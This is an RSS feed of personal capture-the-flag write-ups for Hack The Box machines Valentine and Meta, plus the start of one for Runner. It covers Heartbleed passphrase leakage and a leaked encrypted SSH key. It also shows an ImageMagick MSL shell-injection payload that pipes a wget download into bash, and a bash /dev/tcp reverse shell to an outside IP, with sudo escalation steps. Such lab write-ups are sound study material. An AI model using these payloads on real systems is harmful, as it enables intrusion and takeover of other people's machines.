<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Mon, 14 Oct 2024 15:26:52 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[Valentine]]></title>
            <guid>07cc2e031d394951b83b760f7e8af61f</guid>
            <pubDate>Sat, 12 Oct 2024 09:17:03 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
<p>No domain this time.<br />
<img src="/_resources/e85d38d643914433a21539961ce0faca.png" /></p>
<div><pre class="hljs"><code>$nmap -p- -A <span class="hljs-number">10.129</span><span class="hljs-number">.168</span><span class="hljs-number">.63</span>
Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-12</span> <span class="hljs-number">09</span>:<span class="hljs-number">20</span> UTC
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.168</span><span class="hljs-number">.63</span>
Host is up (<span class="hljs-number">0.053</span>s latency).
Not shown: <span class="hljs-number">65532</span> closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
<span class="hljs-number">22</span>/tcp  open  ssh      OpenSSH <span class="hljs-number">5.9</span>p1 Debian <span class="hljs-number">5</span>ubuntu1<span class="hljs-number">.10</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
| <span class="hljs-type">ssh</span>-hostkey: 
|   <span class="hljs-type">1024</span> <span class="hljs-number">96</span>:<span class="hljs-number">4</span>c:<span class="hljs-number">51</span>:<span class="hljs-number">42</span>:<span class="hljs-number">3</span>c:ba:<span class="hljs-number">22</span>:<span class="hljs-number">49</span>:<span class="hljs-number">20</span>:<span class="hljs-number">4</span>d:<span class="hljs-number">3</span>e:ec:<span class="hljs-number">90</span>:cc:fd:<span class="hljs-number">0</span>e (DSA)
|   <span class="hljs-type">2048</span> <span class="hljs-number">46</span>:bf:<span class="hljs-number">1</span>f:cc:<span class="hljs-number">92</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">1</span>d:a0:<span class="hljs-number">42</span>:b3:d2:<span class="hljs-number">16</span>:a8:<span class="hljs-number">58</span>:<span class="hljs-number">31</span>:<span class="hljs-number">33</span> (RSA)
|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> e6:<span class="hljs-number">2</span>b:<span class="hljs-number">25</span>:<span class="hljs-number">19</span>:cb:<span class="hljs-number">7</span>e:<span class="hljs-number">54</span>:cb:<span class="hljs-number">0</span>a:b9:ac:<span class="hljs-number">16</span>:<span class="hljs-number">98</span>:c6:<span class="hljs-number">7</span>d:a9 (ECDSA)
<span class="hljs-number">80</span>/tcp  open  http     Apache httpd <span class="hljs-number">2.2</span><span class="hljs-number">.22</span> ((Ubuntu))
|<span class="hljs-type">_http</span>-title: Site doesn't have a title (text/html).
|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.2</span><span class="hljs-number">.22</span> (Ubuntu)
<span class="hljs-number">443</span>/tcp open  ssl/http Apache httpd <span class="hljs-number">2.2</span><span class="hljs-number">.22</span> ((Ubuntu))
|<span class="hljs-type">_http</span>-title: Site doesn't have a title (text/html).
|<span class="hljs-type">_ssl</span>-date: <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-12</span>T09:<span class="hljs-number">20</span>:<span class="hljs-number">50</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-5</span>s from scanner <span class="hljs-built_in">time</span>.
|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.2</span><span class="hljs-number">.22</span> (Ubuntu)
| <span class="hljs-type">ssl</span>-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2018</span><span class="hljs-number">-02</span><span class="hljs-number">-06</span>T00:<span class="hljs-number">45</span>:<span class="hljs-number">25</span>
|<span class="hljs-type">_Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2019</span><span class="hljs-number">-02</span><span class="hljs-number">-06</span>T00:<span class="hljs-number">45</span>:<span class="hljs-number">25</span>
Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
<p>Running with --script vuln, shows that we can use heartbleed attack.</p>
<div><pre class="hljs"><code>dirsearch -u http:<span class="hljs-comment">//10.129.168.63/</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">243</span>B  - /<span class="hljs-selector-class">.ht_wsr</span><span class="hljs-selector-class">.txt</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">243</span>B  - /<span class="hljs-selector-class">.htaccess</span><span class="hljs-selector-class">.sample</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">243</span>B  - /<span class="hljs-selector-class">.htaccess_orig</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">242</span>B  - /<span class="hljs-selector-class">.htaccess_sc</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.htaccessBAK</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.htaccessOLD2</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">242</span>B  - /<span class="hljs-selector-class">.htaccess</span><span class="hljs-selector-class">.bak1</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">242</span>B  - /<span class="hljs-selector-class">.htaccess</span><span class="hljs-selector-class">.orig</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">244</span>B  - /<span class="hljs-selector-class">.htaccess_extra</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.htaccessOLD</span>
<span class="hljs-selector-attr">[09:22:48]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.htaccess</span><span class="hljs-selector-class">.save</span>
<span class="hljs-selector-attr">[09:22:49]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">237</span>B  - /<span class="hljs-selector-class">.htm</span>
<span class="hljs-selector-attr">[09:22:49]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">237</span>B  - /<span class="hljs-selector-class">.html</span>
<span class="hljs-selector-attr">[09:22:49]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">246</span>B  - /<span class="hljs-selector-class">.htpasswd_test</span>
<span class="hljs-selector-attr">[09:22:49]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.htpasswds</span>
<span class="hljs-selector-attr">[09:22:49]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /<span class="hljs-selector-class">.httr-oauth</span>
<span class="hljs-selector-attr">[09:22:59]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">241</span>B  - /cgi-bin/
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">245</span>B  - /dev  -&gt;  http:<span class="hljs-comment">//10.129.168.63/dev/  (!)</span>
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">493</span>B  - /dev/
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">237</span>B  - /doc/
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">244</span>B  - /doc/stable<span class="hljs-selector-class">.version</span>
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">245</span>B  - /doc/html/index<span class="hljs-selector-class">.html</span>
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">240</span>B  - /doc/api/
<span class="hljs-selector-attr">[09:23:03]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">247</span>B  - /doc/en/changes<span class="hljs-selector-class">.html</span>
<span class="hljs-selector-attr">[09:23:16]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">240</span>B  - /server-status/
<span class="hljs-selector-attr">[09:23:16]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">240</span>B  - /server-status</code></pre></div>
<p><img src="/_resources/e7520e590a114cb78c5a4e2b416707df.png" /></p>
<p>Notes.txt:</p>
<div><pre class="hljs"><code><span class="hljs-keyword">To</span> do:

<span class="hljs-number">1</span>) Coffee.
<span class="hljs-number">2</span>) Research.
<span class="hljs-number">3</span>) Fix decoder/encoder before going live.
<span class="hljs-number">4</span>) Make sure encoding/decoding <span class="hljs-keyword">is</span> only done client-<span class="hljs-literal">side</span>.
<span class="hljs-number">5</span>) Don<span class="hljs-symbol">'t</span> <span class="hljs-keyword">use</span> the decoder/encoder <span class="hljs-keyword">until</span> any <span class="hljs-keyword">of</span> this <span class="hljs-keyword">is</span> done.
<span class="hljs-number">6</span>) Find a better way <span class="hljs-keyword">to</span> take notes.</code></pre></div>
<p>Ok, so we can assume that in this box we will abuse server-side encoding.</p>
<p>Hype key is something in hex:<br />
<img src="/_resources/9d1447356be942218636fcfeefbdd673.png" /></p>
<p>Decoding it in cybercheff we get:</p>
<div><pre class="hljs"><code>-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----
Proc-Type: <span class="hljs-number">4</span>,ENCRYPTED
DEK-Info: AES-<span class="hljs-number">128</span>-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
<span class="hljs-number">5</span>y<span class="hljs-regexp">/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/g</span>jB<span class="hljs-regexp">/7/</span>My00Mwx+aI6
<span class="hljs-number">0</span>EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM<span class="hljs-regexp">/kigNRFPYuNiXrXs1w/</span>deLCqCJ+Ea1T8zlas6fcmhM8A+<span class="hljs-number">8</span>P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r<span class="hljs-regexp">/GWMqSOEimNRD1j/</span><span class="hljs-number">59</span>/<span class="hljs-number">4</span>u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
<span class="hljs-number">2</span>VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
<span class="hljs-number">09</span>nVjTaYtWUXk0Si1W02wbu1NzL+<span class="hljs-number">1</span>Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/<span class="hljs-number">9</span>fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+<span class="hljs-number">9</span>xK+TXEL3icmIOBRdPyw6e<span class="hljs-regexp">/JlQlVRlmShFpI8eb/</span><span class="hljs-number">8</span>VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b<span class="hljs-regexp">/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/</span>IzT
RUgZkbMQZNIIfzj1QuilRVBm<span class="hljs-regexp">/F76Y/</span>YMrmnM9k/<span class="hljs-number">1</span>xSGIskwCUQ+<span class="hljs-number">95</span>CGHJE8MkhD3
-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----</code></pre></div>
<p>Trying to log in with this key, we get a prompt asking for passphrase. Lets try the hearthbleed attack.</p>
<p>Running the hearthbleed attack from metasploit (and setting the action to DUMP) we get:<br />
<img src="/_resources/0f559dcb6f734349affc8b4e891d7fd7.png" /></p>
<p>Decoding from base64 we get: heartbleedbelievethehype.</p>
<p>Now we can log in using the ssh to user hype.<br />
One thing that is config specific. I had to enable rsa logging in, as it was disabled by default. To do so, add to ~/.ssh/config:</p>
<div><pre class="hljs"><code>Host *
    <span class="hljs-attribute">PubkeyAcceptedKeyTypes</span>=+ssh-rsa
    <span class="hljs-attribute">HostKeyAlgorithms</span>=+ssh-rsa</code></pre></div>
<p>We are in.</p>
<h1 id="priv-esc">Priv esc</h1>
<p>Running linenum shows us that we have access to user history.</p>
<div><pre class="hljs"><code><span class="hljs-keyword">exit</span>
exot
<span class="hljs-keyword">exit</span>
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S <span class="hljs-regexp">/.devs/</span>dev_sess 
<span class="hljs-keyword">exit</span></code></pre></div>
<p>running <code>tmux -S /.devs/dev_sess </code>, gets us last users session. It’s root. Nice.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Meta]]></title>
            <guid>a3180ea6ec5d43a9894e3a9e9924b688</guid>
            <pubDate>Sun, 18 Aug 2024 19:24:02 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
<div><pre class="hljs"><code>└──╼ $sudo nmap -p- -A artcorp.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 19:22 UTC
Nmap scan report for artcorp.htb (10.129.178.202)
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Home
|_http-server-header: Apache
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   31.53 ms 10.10.14.1
2   31.83 ms 10.129.178.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.70 seconds</code></pre></div>
<div><pre class="hljs"><code>└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.artcorp.htb -fc 301 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.artcorp.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 3076ms]</code></pre></div>
<div><pre class="hljs"><code>└──╼ $gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u artcorp.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 234] [--&gt; http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--&gt; http://artcorp.htb/css/]</code></pre></div>
<p>Checking out the main site gives us not much of value. Links don’t go anywhere, so we have to focus on the interesting subdomain.</p>
<p><img src="/_resources/252b9dae160c44b8a36135d6e499b945.png" /></p>
<p>The subdomain:</p>
<p><img src="/_resources/b7768414e8ed4664824c526d2ec6e457.png" /></p>
<p>Link goes to:</p>
<p><img src="/_resources/de6f1113fb8243bdb016c21b67ec647c.png" /></p>
<h1 id="cve-2021-22204">CVE-2021-22204</h1>
<p>If the site is analyzing metadata, then the first thought is exploiting metadata analyzer.</p>
<p>The first resoult is: <a title="https://github.com/OneSecCyber/JPEG_RCE" href="https://github.com/OneSecCyber/JPEG_RCE">https://github.com/OneSecCyber/JPEG_RCE</a>, so why not give it a go.<br />
Exploit works exactly as in POC, but for some reason reverse shell from it doesnt work.<br />
Searching github for CVE-2021-22204 fortunetly gets us more options.</p>
<p><img src="/_resources/944c1ffbd54f4f34a4866beca9efcf82.png" /></p>
<p>And we are in.<br />
For QoL, we can get shell stablisation.</p>
<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
<span class="hljs-built_in">export</span> TERM=xterm
CTRL-Z
stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
<h1 id="user-access">User access</h1>
<p>Running linenum returns nothing of value.<br />
Running linpeas tells us to check for:</p>
<ol>
<li>
<p>Sudo version 1.8.27</p>
</li>
<li>
<p>[CVE-2019-13272] PTRACE_TRACEME</p>
<p>Details: <a title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a><br />
Exposure: highly probable<br />
Tags: ubuntu=16.04{kernel:4.15.0-<em>},ubuntu=18.04{kernel:4.15.0-</em>},debian=9{kernel:4.9.0-<em>},[ debian=10{kernel:4.19.0-</em>} ],fedora=30{kernel:5.0.9-*}<br />
Download URL: <a title="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip</a><br />
ext-url: <a title="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" href="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c">https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</a><br />
Comments: Requires an active PolKit agent.</p>
</li>
<li>
<p>lrwxrwxrwx 1 root root 35 Aug 29  2021 /etc/apache2/sites-enabled/artcorp.htb.conf -&gt; …/sites-available/artcorp.htb.conf</p>
</li>
</ol>
<p>So checking:</p>
<ol>
<li>Seems to be vulnerable, but cant run it without user password.</li>
<li>Doesnt seem to work on our machine.</li>
<li>This file doesnt exist and we cant create it.</li>
</ol>
<p>Then we can run pspy to inspect what is going on the sysem.<br />
It seems to run a few scripts on regular basis.</p>
<p>2024/08/18 17:59:01 CMD: UID=1000  PID=4389   | /bin/bash /usr/local/bin/convert_images.sh<br />
2024/08/18 18:00:01 CMD: UID=1000  PID=4405   | pkill mogrify</p>
<div><pre class="hljs"><code>www-data@meta:/usr/local/bin$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib</code></pre></div>
<p>Looking for “ImageMagick 7.0.10-36 CVE” gets us CVE-2020-29599.<br />
<a title="https://nvd.nist.gov/vuln/detail/CVE-2020-29599" href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a><br />
<a title="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></p>
<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">'ff" `echo $(id)&gt; ./0wned`;"'</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"pdf:/etc/passwd"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"base-width"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"base-height"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"400x400"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"test.png"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>       
  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"msl:poc.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></code></pre></div>
<p>The POC did work, but it made me mad. Two things:</p>
<ol>
<li>The files in /var/www/dev01.artcorp.htb/convert_images are getting deleted every minute.</li>
<li><code>&lt;image xlink:href="msl:poc.svg" height="100" width="100"/&gt;</code> line has to has to have name of the file in it, which I obviously missed.</li>
<li>Making the script run <code>bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1</code></li>
</ol>
<p>I ended creating a sh script and running it with wget, after wasting way too much time here.</p>
<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1</code></pre></div>
<div><pre class="hljs"><code><span class="hljs-attribute">wget</span> -O - <span class="hljs-number">10.10.14.81</span>/shell.sh | bash</code></pre></div>
<p>and changing the poc to:</p>
<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">'ff" `wget -O - 10.10.14.81/shell.sh | bash`;"'</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"pdf:/etc/passwd"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"base-width"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"base-height"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"400x400"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"test.png"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">$</span>
  &lt;<span class="hljs-attr">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"msl:poc.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></code></pre></div>
<p>Stabilize the shell and finally we can get the user flag for thomas.</p>
<h1 id="priv-esc">Priv esc</h1>
<p>Running linenum.sh gives us</p>
<div><pre class="hljs"><code>[+] We can sudo without supplying a password!
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"</code></pre></div>
<p>Going to gtfobins gives us what we want.<br />
<a title="https://gtfobins.github.io/gtfobins/neofetch/" href="https://gtfobins.github.io/gtfobins/neofetch/">https://gtfobins.github.io/gtfobins/neofetch/</a></p>
<p>We cant run exactly that, as we cannot pass any arguments to neofetch.<br />
Adding <code>exec /bin/sh</code> at the end of the ~/.config/neofetch did not seem to work.</p>
<p>Looking again at <code>sudo -l</code> we can see that the only env value being kept is XDG_COFNIG_HOME. We can set it using <code>export XDG_CONFIG_HOME=/home/thomas/.config</code>. It works!</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Runner]]></title>
            <guid>2229fdbd31f94a4da4528931f4f99c11</guid>
            <pubDate>Wed, 14 Aug 2024 08:19:26 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
<h2 id="nmap">nmap</h2>
<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -A runner.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 08:18 UTC
Nmap scan report <span class="hljs-keyword">for</span> runner.htb (10.129.182.43)
Host is up (0.033s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn<span class="hljs-string">'t have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
<h2 id="dirbuster">dirbuster</h2>
<p><img src="/_resources/e6674a3d868847c9b416ccc517809ba2.png" /></p>
<h2 id="ffuf">ffuf</h2>
